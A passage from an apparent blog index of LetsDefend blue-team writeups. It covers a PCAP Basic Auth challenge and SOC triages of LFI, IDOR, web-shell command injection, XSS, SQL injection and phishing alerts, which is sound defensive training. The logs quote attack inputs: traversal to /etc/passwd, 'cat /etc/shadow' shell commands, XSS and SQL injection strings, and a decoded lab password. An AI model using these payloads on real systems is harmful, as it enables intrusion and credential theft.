2026","externalUrl":null,"permalink":"/tags/command_injection/","section":"Tags","summary":"","title":"Command_Injection","type":"tags"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/tags/forced_browsing/","section":"Tags","summary":"","title":"Forced_Browsing","type":"tags"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/tags/http/","section":"Tags","summary":"","title":"HTTP","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents an easy-level challenge focused on analyzing HTTP Auth in a PCAP. Challenge Overview # Role Targeted: Security Analyst Skill Level: Easy\nScenario # We receive a log indicating a possible attack, can you gather information from the .pcap file?\nLog file: /root/Desktop/ChallengeFile/webserver.em0.pcap\nNote: pcap file found public resources.\nPCAP Analysis # Tools Used # WireShark CyberChef Question-Based Analysis # How many HTTP GET requests are in pcap? Using a Wireshark filter of http.request.method == GET, we get a return of 5 packets. What is the server operating system? Right-click -\u0026gt; Follow -\u0026gt; HTTP Stream; abstracts away a lot of the network details and gives us the HTTP protocol details. Including the responding header from the server including Server: Apache/2.2.15 (FreeBSD) DAV/2 mod_ssl/2.2.15 OpenSSL/0.9.8n which points out the server is running FreeBSD. What is the name and version of the web server software? As we found from the Server: header in the last question, the web server is running Apache/2.2.15 What is the version of OpenSSL running on the server? As we found from the Server: header in the last question, the web server is running OpenSSL/0.9.8n What is the client\u0026rsquo;s user-agent information? The HTTP Stream also includes the client\u0026rsquo;s HTTP headers, including: User-Agent: Lynx/2.8.7rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8n What is the username used for Basic Authentication? If we close out of the HTTP stream and instead Right-click -\u0026gt; Follow -\u0026gt; TCP Stream; we can swap between the different TCP streams using the up and down buttons on the \u0026ldquo;Stream\u0026rdquo; ID in the bottom right of the window. In TCP stream 1 we find the client sending the header: Authorization: Basic d2ViYWRtaW46VzNiNERtMW4= Throwing the base64 part of that header into CyberChef gives us: webadmin:W3b4Dm1n authorization goes in the order of Username:Password, so the answer is webadmin Side note: we could\u0026rsquo;ve also thrown this into base64 -d in the terminal, but I already had CyberChef open. What is the user password used for Basic Authentication? We found this out in the last question: W3b4Dm1n Summary # Questions Answers How many HTTP GET requests are in pcap? 5 What is the server operating system? freebsd What is the name and version of the web server software? apache/2.2.15 What is the version of OpenSSL running on the server? openssl/0.9.8n What is the client\u0026rsquo;s user-agent information? lynx/2.8.7rel.1 libwww-fm/2.14 ssl-mm/1.4.1 openssl/0.9.8n What is the username used for Basic Authentication? webadmin What is the user password used for Basic Authentication? w3b4dm1n Key Takeaways # \u0026ldquo;Wireshark basics are always good to reinforce.\u0026rdquo;\n","date":"February 23 2026","externalUrl":null,"permalink":"/writeups/letsdefend/challenges/http_basic_auth./","section":"Writeups","summary":"Analyzing a PCAP file to identify HTTP GET requests, enumerate server and client details from HTTP headers, and decode Basic Authentication credentials using Wireshark and CyberChef.","title":"(Writeup) LetsDefend Challenge - Http Basic Auth.","type":"writeups"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/tags/cyberchef/","section":"Tags","summary":"","title":"CyberChef","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation involving an attempted local file inclusion with directory traversal. Alert Details # Key: Value EventID: 120 Event Time: Mar, 01, 2022, 10:10 AM Rule: SOC170 - Passwd Found in Requested URL - Possible LFI Attack Level: Security Analyst Hostname: WebServer1006 Destination IP Address: 172.16.17.13 Source IP Address: 106.55.45.162 HTTP Request Method: GET Requested URL: https://172.16.17.13/?file=../../../../etc/passwd User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322) Alert Trigger Reason: URL Contains passwd Device Action: Allowed Initial Triage # Actions: # Copied alert details to notes Created case Began analysis Thoughts # \u0026ldquo;That URL is quite blatant in being LFI. I wish the alert included HTTP response codes. Gotta look at the SIEM logs.\u0026rdquo;\nLog Analysis # Key: Value type: Firewall source_address: 106.55.45.162 source_port: 49028 destination_address: 172.16.17.13 destination_port: 443 time: Mar, 01, 2022, 10:10 AM Request URL: https://172.16.17.13/?file=../../../../etc/passwd User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1... Request Method: GET Device Action: Permitted HTTP Response Size: 0 HTTP Response Status: 500 Thoughts # \u0026ldquo;They got an HTTP 500 response status so the attempt failed. Only the one log, which is very curious.\u0026rdquo;\nEmail # Thoughts # \u0026ldquo;No email indicating this is an authorized penetration test.\u0026rdquo;\nDetermination # Verdict # True Positive Close Case Reasoning # Attacker did attempt to do LFI on https://172.16.17.13/ GET method file parameter. Server responded with a size 0 HTTP 500 Internal Server Error; thwarting the attempt. Playbook # Questions # Questions Answers Is Traffic Malicious? Malicious What Is The Attack Type? LFI \u0026amp; RFI Check If It Is a Planned Test Not Planned What Is the Direction of Traffic? Internet → Company Network Was the Attack Successful? No Do You Need Tier 2 Escalation? No Artifacts # Value Comment Type 106.55.45.162 Attacker IP IP Address Notes # Verdict: True Positive. Blocked. Summary: Verified as LFI attempt. Was refused by the endpoint with a HTTP 500 response. Validated via: SIEM logs. Actions taken: None.\nFinal Thoughts # \u0026ldquo;Clean cut. Odd that the attacker didn\u0026rsquo;t do reconnaissance beforehand.\u0026rdquo;\n","date":"February 23 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/170_120/","section":"Writeups","summary":"Investigating a suspected local file inclusion alert after a directory traversal attempt targeted /etc/passwd, reviewing SIEM HTTP logs, and confirming the attack failed based on a 500 server response with no returned content.","title":"(Writeup) LetsDefend EventID: 120 - [SOC170 - Passwd Found in Requested URL - Possible LFI Attack]","type":"writeups"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/tags/lfi/","section":"Tags","summary":"","title":"LFI","type":"tags"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/tags/type_web_attack/","section":"Tags","summary":"","title":"Type_Web_Attack","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation involving an insecure direct object reference (IDOR). Alert Details # Key: Value EventID: 119 Event Time: Feb, 28, 2022, 10:48 PM Rule: SOC169 - Possible IDOR Attack Detected Level: Security Analyst Hostname: WebServer1005 Destination IP Address: 172.16.17.15 Source IP Address: 134.209.118.137 HTTP Request Method: POST Requested URL: https://172.16.17.15/get_user_info/ User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322) Alert Trigger Reason: consecutive requests to the same page Device Action: Allowed Initial Triage # Actions # Copied alert details to notes Created case Began analysis Thoughts # \u0026ldquo;Hmm, gotta check the SIEM logs first. I want to see the details of the HTTP requests.\u0026rdquo;\nAnalysis # Log Analysis # (Simplifying for writeup brevity)\nKey: Value type: Firewall source_address: 134.209.118.137 destination_address: 172.16.17.15 destination_port: 443 Request URL: https://172.16.17.15/get_user_info/ Request Method: POST Device Action: Permitted Key: Value HTTP Response Size: 188 HTTP Response Status: 200 POST Parameters: ?user_id=1 Key: Value HTTP Response Size: 253 HTTP Response Status: 200 POST Parameters: ?user_id=2 Key: Value HTTP Response Size: 351 HTTP Response Status: 200 POST Parameters: ?user_id=3 Key: Value HTTP Response Size: 158 HTTP Response Status: 200 POST Parameters: ?user_id=4 Key: Value HTTP Response Size: 267 HTTP Response Status: 200 POST Parameters: ?user_id=5 Thoughts # \u0026ldquo;Yeah, that\u0026rsquo;s 100% IDOR. The responses aren\u0026rsquo;t being blocked. The response sizes vary on different inputs, which gives reason to believe it is successful.\u0026rdquo;\nEmail # Thoughts # \u0026ldquo;No emails indicating this is a penetration test.\u0026rdquo;\nDetermination # Verdict # True Positive Escalate Case Reasoning # Attacker incrementing value by 1 each connection, sweeping \u0026ldquo;user_id\u0026rdquo; parameter for responses. Varying response sizes with a 200 status indicates they are getting valid information back, which means the server is vulnerable. Flaw in the endpoint will need to be fixed. Playbook # Questions # Questions Answers Is Traffic Malicious? Malicious What Is The Attack Type? IDOR Check If It Is a Planned Test Not Planned What Is the Direction of Traffic? Internet → Company Network Was the Attack Successful? Yes Do You Need Tier 2 Escalation? Yes Artifacts # Value Comment Type 134.209.118.137 Attacker IP IP Address https://172.16.17.15/get_user_info/ Vulnerable URL E-mail Domain Notes # Verdict: True Positive. Escalating. Summary: Attacker abusing IDOR on 172.16.17.15 /get_user_info/ POST parameter user_id. Validated via: SIEM Logs\nActions taken: None.\nFinishing Thoughts # \u0026ldquo;Wish there was more I could do. IDOR doesn\u0026rsquo;t cause code execution, so that isn\u0026rsquo;t a worry at least. I don\u0026rsquo;t have permission to do more at the moment.\u0026rdquo;\n","date":"February 22 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/169_119/","section":"Writeups","summary":"Investigating an IDOR alert after repeated POST requests incremented a user ID parameter, reviewing HTTP logs and response behavior, and confirming successful data exposure based on varying response sizes and consistent 200 status codes before escalating the case.","title":"(Writeup) LetsDefend EventID: 119 - [SOC169 - Possible IDOR Attack Detected]","type":"writeups"},{"content":"","date":"February 22 2026","externalUrl":null,"permalink":"/tags/idor/","section":"Tags","summary":"","title":"IDOR","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation involving command injection. Alert Details # Key Value EventID: 118 Event Time: Feb, 28, 2022, 04:12 AM Rule: SOC168 - Whoami Command Detected in Request Body Level: Security Analyst Hostname: WebServer1004 Destination IP Address: 172.16.17.16 Source IP Address: 61.177.172.87 HTTP Request Method: POST Requested URL: https://172.16.17.16/video/ User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Alert Trigger Reason: Request Body Contains whoami string Device Action: Allowed Initial Triage # Actions: # Copied alert details to notes Created case Began analysis Thoughts: # \u0026ldquo;A POST on /video/ containing whoami? That\u0026rsquo;s suspicious\u0026hellip; Time to investigate!\u0026rdquo;\nAnalysis # Tools Used: # VirusTotal Talos Intelligence AbuseIPDB IP: # Key Value VirusTotal: 3/93 Malicious Talos Intelligence: Neutral AbuseIPDB: 86,782 Reports (Hacking) Thoughts: # \u0026ldquo;That is an impressive amount of reports\u0026hellip; Also, it\u0026rsquo;s not good for the chance of it being a false positive.\u0026rdquo;\nLog Analysis # Key Value Request URL: https://172.16.17.16/video/ Request Method: POST Device Action: Permitted HTTP Response Size: 1021 HTTP Response Status: 200 POST Parameters: ?c=ls Key Value Request URL: https://172.16.17.16/video/ Request Method: POST Device Action: Permitted HTTP Response Size: 912 HTTP Response Status: 200 POST Parameters: ?c=whoami Key Value Request URL: https://172.16.17.16/video/ Request Method: POST Device Action: Permitted HTTP Response Size: 910 HTTP Response Status: 200 POST Parameters: ?c=uname Key Value Request URL: https://172.16.17.16/video/ Request Method: POST Device Action: Permitted HTTP Response Size: 1321 HTTP Response Status: 200 POST Parameters: ?c=cat /etc/passwd Key Value Request URL: https://172.16.17.16/video/ Request Method: POST Device Action: Permitted HTTP Response Size: 1501 HTTP Response Status: 200 POST Parameters: ?c=cat /etc/shadow Thoughts: # \u0026ldquo;Oh\u0026hellip; oh no. /video/ has a web shell. The c parameter is being taken and executed. We can tell because the HTTP Response Size varies depending on the command executed.\u0026rdquo;\nAction: # Containment of WebServer1004 endpoint initiated. Email # Thoughts: # \u0026ldquo;No email stating there is a penetration test going on. Didn\u0026rsquo;t think there would be, but I had to check regardless.\u0026rdquo;\nEndpoint Status # Key Value Execution Confirmed: Yes Quarantine Status: Not Quarantined Infection Status: Infected EDR Agent: Active Containment: Initiated Findings: # Key Value Reputation Results: Malicious Endpoint Execution: True Confidence Level: High Thoughts: # \u0026ldquo;This case is going to have to be escalated\u0026hellip; I don\u0026rsquo;t have logs showing how that webshell got there.\u0026rdquo;\nDetermination # Verdict: # True Positive Escalate Case Reasoning: # SIEM logs imply the attacker gained execution via a webshell on /video/ using the POST parameter c. Commend execution believed to have succeeded based on the HTTP response size variation based on the command sent. Unknown how the webshell appeared on the endpoint. Playbook # Questions: # Question Answer Is Traffic Malicious? Malicious What Is The Attack Type? Command Injection Check If It Is a Planned Test Not Planned What Is the Direction of Traffic? Internet → Company Network Was the Attack Successful? Yes Do You Need Tier 2 Escalation? Yes Artifacts: # Value Comment Type 61.177.172.87 Attacker IP IP Address Notes: # Verdict: True Positive. Containment Initiated. Escalation Requested.\nSummary: Attacker sent command injection via c parameter to /video/, getting command execution. No logs on when the webshell appeared. Containment Initiated.\nValidated via: SIEM logs and EDR Agent. Actions taken: Containment Initiated.\nFinal Thoughts: # \u0026ldquo;There was no normal traffic from that IP beforehand either. Not even discovering /videos/ which makes me worried\u0026hellip; How did they know it was there, and that you could execute commands on the c parameter? Did they put it there or did someone else?\u0026rdquo;\n","date":"February 21 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/168_118/","section":"Writeups","summary":"Investigating a command injection alert after POST requests containing system commands targeted a web endpoint, validating attacker IP reputation and analyzing HTTP response behavior, confirming successful command execution through response size variation, and initiating containment and escalation due to a confirmed web shell.","title":"(Writeup) LetsDefend EventID: 118 - [SOC168 - Whoami Command Detected in Request Body]","type":"writeups"},{"content":"","date":"February 21 2026","externalUrl":null,"permalink":"/tags/abuseipdb/","section":"Tags","summary":"","title":"AbuseIPDB","type":"tags"},{"content":"","date":"February 21 2026","externalUrl":null,"permalink":"/tags/talos_intelligence/","section":"Tags","summary":"","title":"Talos_Intelligence","type":"tags"},{"content":"","date":"February 21 2026","externalUrl":null,"permalink":"/tags/web_shell/","section":"Tags","summary":"","title":"Web_Shell","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation into a false-positive command-injection alert. Alert Details # Key Value EventID: 117 Event Time: Feb, 27, 2022, 12:36 AM Rule: SOC167 - LS Command Detected in Requested URL Level: Security Analyst Hostname: EliotPRD Destination IP Address: 188.114.96.15 Source IP Address: 172.16.17.46 HTTP Request Method: GET Requested URL: https://letsdefend.io/blog/?s=skills User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0 Alert Trigger Reason: URL Contains LS Device Action: Allowed Initial Triage # Actions: # Copied alert details to notes Created case Began analysis Thoughts: # \u0026ldquo;Judging purely off that URL, it looks like a false positive.\u0026rdquo;\nAnalysis # Tools Used: # VirusTotal Talos Intelligence AbuseIPDB IP: # Key Value VirusTotal: 0/93 (CloudFlare) Talos Intelligence: Neutral (CloudFlare) AbuseIPDB: 7 Reports (CloudFlare Reverse Proxy) Thoughts: # \u0026ldquo;LetsDefend probably just needed an IP for the alert\u0026hellip;\u0026rdquo;\nLog Analysis # (Log majorly simplified for writeup brevity)\nKey Value Request URL 1: https://letsdefend.io/blog/ Request URL 2: https://letsdefend.io/blog/how-to-become-a-soc-analyst/ Request URL 3: https://letsdefend.io/blog/how-to-analyze-rtf-template-injection-attacks/ Request URL 4: https://letsdefend.io/blog/red-team-vs-blue-team-learn-the-difference/ Request URL 5: https://letsdefend.io/blog/how-to-prepare-soc-analyst-resume/ Request URL 6: https://letsdefend.io/blog/?s=skills Request URL 7: https://letsdefend.io/blog/soc-analyst-career-without-a-degree/ Thoughts: # \u0026ldquo;False positive, normal traffic. Alert tripped due to word \u0026lsquo;skills\u0026rsquo; containing \u0026rsquo;ls\u0026rsquo;.\u0026rdquo;\nDetermination # Verdict: # False Positive Close Case Reasoning: # Normal user traffic in SIEM logs. Alert triggered due to word \u0026ldquo;skills\u0026rdquo; containing \u0026ldquo;ls\u0026rdquo; Playbook # Questions: # Question Answer Is Traffic Malicious? Non-malicious Is There a Different Request/Traffic? Yes Is Traffic Malicious? Non-malicious Notes: # Verdict: False Positive. Summary: Normal traffic. Alert tripped due to word \u0026lsquo;skills\u0026rsquo; containing \u0026rsquo;ls\u0026rsquo;.\nValidated via: SIEM logs. Actions taken: None.\nFinal Thoughts: # \u0026ldquo;That alert rule should be tuned to not trigger on expected words\u0026hellip;\u0026rdquo;\n","date":"February 21 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/167_117/","section":"Writeups","summary":"Investigating a command-injection alert after a URL triggered on the string “ls,” reviewing SIEM logs and threat intelligence data, and determining the activity was normal user browsing traffic that resulted in a false positive.","title":"(Writeup) LetsDefend EventID: 117 - [SOC167 - LS Command Detected in Requested URL]","type":"writeups"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation involving an XSS attempt. Alert Details # Key Value EventID: 116 Event Time: Feb, 26, 2022, 06:56 PM Rule: SOC166 - Javascript Code Detected in Requested URL Level: Security Analyst Hostname: WebServer1002 Destination IP Address: 172.16.17.17 Source IP Address: 112.85.42.13 HTTP Request Method: GET Requested URL: https://172.16.17.17/search/?q=\u0026lt;$script\u0026gt;javascript:$alert(1)\u0026lt;$/script\u0026gt; User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1 Alert Trigger Reason: Javascript code detected in URL Device Action: Allowed Initial Triage # Actions: # Copied alert details to notes Created case Began analysis Thoughts: # \u0026ldquo;Obvious XSS attempt. Why was it allowed?\u0026rdquo;\nAnalysis # Tools Used: # VirusTotal Talos Intelligence AbuseIPDB Source IP # Key Value VirusTotal: 0/93 (-14 Community Score) Talos Intelligence: Neutral AbuseIPDB: 45,324 Reports Thoughts: # \u0026ldquo;\u0026hellip;That\u0026rsquo;s a lot of AbuseIPDB reports. Looks like they\u0026rsquo;ve done a lot of SSH brute-forcing.\u0026rdquo;\nSIEM Logs # (Logs simplified for writeup brevity)\nKey Value Request URL: https://172.16.17.17/ Request Method: GET Device Action: Permitted HTTP Response Size: 1024 HTTP Response Status: 200 Key Value Request URL: https://172.16.17.17/about-us/ Request Method: GET Device Action: Permitted HTTP Response Size: 3531 HTTP Response Status: 200 Key Value Request URL: https://172.16.17.17/search/?q=test Request Method: GET Device Action: Permitted HTTP Response Size: 885 HTTP Response Status: 200 Key Value Request URL: https://172.16.17.17/search/?q=\u0026lt;$img%20src%20=q%20onerror=prompt(8)$\u0026gt; Request Method: GET Device Action: Permitted HTTP Response Size: 0 HTTP Response Status: 302 Key Value Request URL: https://172.16.17.17/search/?q=prompt(8) Request Method: GET Device Action: Permitted HTTP Response Size: 0 HTTP Response Status: 302 Key Value Request URL: https://172.16.17.17/search/?q=\u0026lt;$script\u0026gt;$for((i)in(self))eval(i)(1)\u0026lt;$/script\u0026gt; Request Method: GET Device Action: Permitted HTTP Response Size: 0 HTTP Response Status: 302 Key Value Request URL: https://172.16.17.17/search/?q=\u0026lt;$svg\u0026gt;\u0026lt;$script%20?\u0026gt;$alert(1) Request Method: GET Device Action: Permitted HTTP Response Size: 0 HTTP Response Status: 302 Key Value Request URL: https://172.16.17.17/search/?q=\u0026lt;$script\u0026gt;javascript:$alert(1) Request Method: GET Device Action: Permitted HTTP Response Size: 0 HTTP Response Status: 302 Thoughts: # \u0026ldquo;We only got an alert for one\u0026hellip; Gonna have to mention that. But yeah, this is obviously XSS attempts. Luckily, all those attempts ended in failure as the server responded with a HTTP 302 redirection code every XSS attempt. Normal queries respond in HTTP 200.\u0026rdquo;\nEndpoint # Thoughts: # \u0026ldquo;XSS isn\u0026rsquo;t an attack type that gets code execution on the server. Maybe a stored XSS would be something to investigate, but the attacker failed.\u0026rdquo;\nEmail # Thoughts: # \u0026ldquo;No email stating this is an authorized penetration test. Didn\u0026rsquo;t think so with the IP reputation.\u0026rdquo;\nFindings: # Key Value Source Reputation: Malicious Endpoint Exploitation: False Confidence Level: High Thoughts: # \u0026ldquo;Attacker threw basic XSS tests at the server to see if they reflected, but just got 302 redirect responses instead.\u0026rdquo;\nDetermination # Verdict: # True Positive Close Case Reasoning: # The attacker attempted to find an XSS vulnerability on the endpoint. The attacker failed. The server responded with 302 redirects in response to XSS attempts. Regular activity responds with 200. Playbook # Questions: # Question Answer Is Traffic Malicious? Malicious What Is The Attack Type? XSS Check If It Is a Planned Test Not Planned What Is the Direction of Traffic? Internet → Company Network Was the Attack Successful? No Artifacts: # Value Comment Type 112.85.42.13 Attacking IP IP Address Notes: # Verdict: True Positive. Blocked. Summary: Attacker attempted to inject XSS into the q parameter on /search/, but all attempts resulted in a HTTP 302 redirect. Normal activity results in HTTP 200.\nValidated via: SIEM Logs\nActions taken: None.\nFinal Thoughts: # \u0026ldquo;It\u0026rsquo;s worrying that only a single alert came through for all of those XSS attempts. Also, WAF please.\u0026rdquo;\n","date":"February 21 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/166_116/","section":"Writeups","summary":"Investigating an XSS alert after multiple JavaScript payloads were sent to a web application, validating the attacker IP reputation and reviewing HTTP response behavior, and confirming the attempts failed based on consistent 302 redirects and clean endpoint verification.","title":"(Writeup) LetsDefend EventID: 116 - [SOC166 - Javascript Code Detected in Requested URL]","type":"writeups"},{"content":"","date":"February 21 2026","externalUrl":null,"permalink":"/tags/xss/","section":"Tags","summary":"","title":"XSS","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation involving a web attack; specifically a SQL injection attempt. Alert Details # Key Value EventID: 115 Event Time: Feb, 25, 2022, 11:34 AM Rule: SOC165 - Possible SQL Injection Payload Detected Level: Security Analyst Hostname: WebServer1001 Destination IP Address: 172.16.17.18 Source IP Address: 167.99.169.17 HTTP Request Method: GET Requested URL: https://172.16.17.18/search/?q=%22%20OR%201%20%3D%201%20--%20- User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1 Alert Trigger Reason: Requested URL Contains OR 1 = 1 Device Action: Allowed Initial Triage # Actions: # Copied alert details to notes Created case Began analysis Thoughts: # \u0026ldquo;That\u0026rsquo;s an obvious SQLI attempt\u0026hellip; it was allowed?\u0026rdquo;\nAnalysis # Tools Used # VirusTotal Talos Intelligence AbuseIPDB CyberChef IP # Key Value VirusTotal: 4/93 Malicious Talos Intelligence: Neutral AbuseIPDB: 14,851 Reports (Hacking) Thoughts: # \u0026ldquo;That\u0026hellip; is an impressive amount of AbuseIPDB reports.\u0026rdquo;\nSIEM Logs # (Basic logs for writeup brevity)\nKey Value Request URL: https://172.16.17.18/ Request Method: GET Device Action: Permitted HTTP Response Size:: 3547 HTTP Response Status: 200 Key Value Request URL: https://172.16.17.18/search/?q=%27%20OR%20%271 Request Method: GET Device Action: Permitted HTTP Response Size:: 948 HTTP Response Status: 500 Key Value Request URL: https://172.16.17.18/search/?q=%27 Request Method: GET Device Action: Permitted HTTP Response Size: 948 HTTP Response Status: 500 Key Value Request URL: https://172.16.17.18/search/?q=%27%20OR%20%27x%27%3D%27x Request Method: GET Device Action: Permitted HTTP Response Size: 948 HTTP Response Status: 500 Key Value Request URL: https://172.16.17.18/search/?q=1%27%20ORDER%20BY%203--%2B Request Method: GET Device Action: Permitted HTTP Response Size: 948 HTTP Response Status: 500 Key Value Request URL: https://172.16.17.18/search/?q=%22%20OR%201%20%3D%201%20--%20- Request Method: GET Device Action: Permitted HTTP Response Size: 948 HTTP Response Status: 500 URL Decode # Original: Decoded with CyberChef: %27%20OR%20%271: ' OR '1 %27: ' %27%20OR%20%27x%27%3D%27x: ' OR 'x'='x 1%27%20ORDER%20BY%203--%2B: 1' ORDER BY 3--+ %22%20OR%201%20%3D%201%20--%20-: \u0026quot; OR 1 = 1 -- - Thoughts: # \u0026ldquo;All attempts at SQL Injection got an 500 Internal Server Error back with the same length. (Would have preferred a 400 family error.)\u0026rdquo;\nEmail Logs # Thoughts: # \u0026ldquo;I didn\u0026rsquo;t think it would be an authorized penetration test with the IP reputation of the source address, but I had to check anyways. No emails in the system authorizing a pentest on that host during this time.\u0026rdquo;\nEndpoint # Thoughts: # \u0026ldquo;Confirmed with EDR Agent. Nothing of note. Endpoint is clean. No action needed.\u0026rdquo;\nFindings # Key Value Source Reputation: Malicious Endpoint Exploitation: False Confidence: High Thoughts: # \u0026ldquo;Attacker wildly threw the most basic of SQL injection attacks at the server with no success.\u0026rdquo;\nDetermination # Verdict: # True Positive Close Case Reasoning: # There was a SQL Injection attack. The attack was unsuccessful. Playbook # Questions: # Question Answer Is Traffic Malicious? Malicious What Is The Attack Type? SQL Injection Check If It Is a Planned Test. Not Planned What Is the Direction of Traffic? Internet → Company Network Was the Attack Successful? No Do You Need Tier 2 Escalation? No Artifacts: # Value Comment Type 167.99.169.17 Attacker IP IP Address Notes: # Verdict: True Positive. Blocked. Summary: Attacker sent SQL Injections at endpoint. Endpoint responded with 500 \u0026ldquo;internal server error\u0026rdquo; to each attempt.\nValidated via: SIEM logs Actions taken: None.\nFinishing Thoughts # \u0026ldquo;If there isn\u0026rsquo;t a WAF between that server and the outside world, there should be.\u0026rdquo;\n","date":"February 21 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/165_115/","section":"Writeups","summary":"Investigating a SQL injection alert after repeated crafted payloads targeted a web server, decoding and validating the requests through log analysis, reviewing source IP reputation across multiple threat intelligence sources, and confirming the attack was unsuccessful based on server responses and endpoint verification.","title":"(Writeup) LetsDefend EventID: 115 - [SOC165 - Possible SQL Injection Payload Detected]","type":"writeups"},{"content":"","date":"February 21 2026","externalUrl":null,"permalink":"/tags/sqli/","section":"Tags","summary":"","title":"SQLi","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a beginner-level challenge focused on analyzing email files for header tricks and mismatches. Challenge Overview # Role Targeted: Security Analyst Skill Level: Beginner\nScenario: # Your email address has been leaked and you receive an email from Paypal in German. Try to analyze the suspicious email.\nFile location: C:\\Users\\LetsDefend\\Desktop\\Files\\PhishingChallenge.zip Password: infected This challenge prepared by @Fuuji\nInvestigation Workflow # This challenge simulates a phishing scenario. We are given a phishing email, and we are to analyze it to answer the following questions:\nWhat is the return path of the email? What is the domain name of the url in this mail? Is the domain mentioned in the previous question suspicious? What is the body SHA-256 of the domain? Is this email a phishing email? Thoughts: # \u0026ldquo;Emails are essentially plain text. So while I could open this in outlook or thunderbird, I\u0026rsquo;m just going to open this in Notepad++ and give it a look. I should be able to answer the questions with that.\u0026rdquo;\nAnalysis # \u0026ldquo;Return-Path\u0026rdquo; is easy to find in the header. Line 27: bounce@rjttznyzjjzydnillquh.designclub.uk.com URL in the email implies it\u0026rsquo;ll be in the body. Line 104: storage.googleapis.com We can throw it in LOTS-Project to find out! Tags \u0026ldquo;Phishing, Download, Exfiltration, C\u0026amp;C\u0026rdquo;: Yes Of the domain? Odd question\u0026hellip; To VirusTotal SHA-256: 13945ecc33afee74ac7f72e1d5bb73050894356c4bf63d02a1a53e76830567f5 For the many anomalous reasons: Yes Key Takeaways # \u0026ldquo;Analyzing email headers is pretty easy. But the key takeaway I see here is the reminder that adversaries utilize trusted websites in various ways! Shout out LOTS-Project!\u0026rdquo;\n","date":"February 20 2026","externalUrl":null,"permalink":"/writeups/letsdefend/challenges/phishing_email/","section":"Writeups","summary":"Analyzing a suspicious PayPal-themed email by reviewing headers, identifying a deceptive return path, extracting a URL hosted on a trusted platform, validating domain reputation, and confirming phishing activity leveraging living-off-trusted-sites techniques.","title":"(Writeup) LetsDefend Challenge - Phishing Email","type":"writeups"},{"content":"","date":"February 20 2026","externalUrl":null,"permalink":"/tags/beginner/","section":"Tags","summary":"","title":"Beginner","type":"tags"},{"content":"","date":"February 20 2026","externalUrl":null,"permalink":"/tags/living_off_trusted_sites/","section":"Tags","summary":"","title":"Living_Off_Trusted_Sites","type":"tags"},{"content":"","date":"February 20 2026","externalUrl":null,"permalink":"/tags/phishing/","section":"Tags","summary":"","title":"Phishing","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation involving a Proxy alert. Alert Details # Key Value EventID: 86 Event Time: Mar, 22, 2021, 9:23 PM Rule: SOC141 - Phishing URL Detected Level: Security Analyst Source Address: 172.16.17.49 Source Hostname: EmilyComp Destination Address: 91.189.114.8 Destination Hostname: mogagrocol.ru Username: ellie Request URL: http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Device Action: Allowed Initial Triage # Actions: # Copied alert details to notes Created case Began threat intelligence analysis Thoughts: # \u0026ldquo;It was allowed? Oh boy\u0026hellip;\u0026rdquo;\nThreat Intelligence Analysis # Tools Used: # VirusTotal Talos Intelligence AbuseIPDB Browserling IP: # Key Value VirusTotal: 0/93 Talos Intelligence: Neutral AbuseIPDB: Unknown Domain: # Key Value VirusTotal: 6/93 - Malicious Talos Intelligence: Neutral URL: # Key Value VirusTotal: 13/94 - Phishing Talos Intelligence: Untrusted - Malicious browserling: 403 Error Findings: # Key Value Reputation Results: Malicious Sandbox Consensus: Error - 403 Conclusion: Phishing page destroyed before analysis. Confidence Level: Medium Thoughts: # \u0026ldquo;Can\u0026rsquo;t analyze the page due to the 403 error, but from the reputation it was most likely malicious.\u0026rdquo;\nEmail Analysis # Thoughts: # \u0026ldquo;There are no email logs to analyze! Emily\u0026rsquo;s email is in the URL. It makes me worry that logs aren\u0026rsquo;t making it to the SIEM.\u0026rdquo;\nLog Analysis # Field Value type Proxy source_address 172.16.17.49 source_port 55662 destination_address 91.189.114.8 destination_port 80 time Mar, 22, 2021, 9:23 PM Request URL http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io Field Value type Firewall source_address 172.16.17.49 source_port 55662 destination_address 91.189.114.8 destination_port 80 time Mar, 22, 2021, 9:23 PM Thoughts: # \u0026ldquo;Nothing new to learn from this information. We already knew the endpoint connected to the website, as the alert was from the proxy log. The firewall log doesn\u0026rsquo;t contain a \u0026lsquo;allow/deny\u0026rsquo; field, which would\u0026rsquo;ve made things clearer. Luckily I already know 